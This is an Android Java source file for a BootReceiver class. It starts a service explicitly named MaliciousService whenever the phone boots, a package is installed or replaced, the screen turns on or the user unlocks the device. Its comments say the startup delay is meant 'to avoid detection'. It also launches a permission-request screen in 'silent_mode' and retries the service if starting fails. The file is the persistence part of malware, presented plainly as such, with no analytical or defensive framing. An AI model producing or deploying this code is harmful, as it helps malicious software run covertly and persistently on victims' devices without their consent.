package com.example.android;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.os.Handler;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "BootReceiver received intent: " + intent.getAction());
        
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            Intent.ACTION_PACKAGE_REPLACED.equals(action) ||
            Intent.ACTION_USER_PRESENT.equals(action) ||
            Intent.ACTION_SCREEN_ON.equals(action) ||
            "android.intent.action.PACKAGE_ADDED".equals(action)) {
            
            Log.d(TAG, "Starting MaliciousService from BootReceiver...");
            
            // Delay startup slightly to avoid detection and ensure system is ready
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    startMaliciousService(context);
                }
            }, 3000); // 3 second delay
        }
    }
    
    private void startMaliciousService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, MaliciousService.class);
            serviceIntent.putExtra("startup_source", "boot_receiver");
            
            // Use regular service for compatibility
            if (context.startService(serviceIntent) != null) {
                Log.d(TAG, "MaliciousService started successfully.");
            } else {
                Log.e(TAG, "Failed to start MaliciousService.");
            }
            
            // Also try to start the permission request activity if needed
            try {
                Intent permissionIntent = new Intent(context, PermissionRequestActivity.class);
                permissionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                permissionIntent.putExtra("silent_mode", true);
                context.startActivity(permissionIntent);
            } catch (Exception e) {
                Log.d(TAG, "Permission activity not started: " + e.getMessage());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting MaliciousService: " + e.getMessage(), e);
            
            // Retry after a delay
            Handler retryHandler = new Handler();
            retryHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        Intent serviceIntent = new Intent(context, MaliciousService.class);
                        context.startService(serviceIntent);
                        Log.d(TAG, "MaliciousService retry successful.");
                    } catch (Exception retryException) {
                        Log.e(TAG, "Retry failed: " + retryException.getMessage());
                    }
                }
            }, 10000); // Retry after 10 seconds
        }
    }
}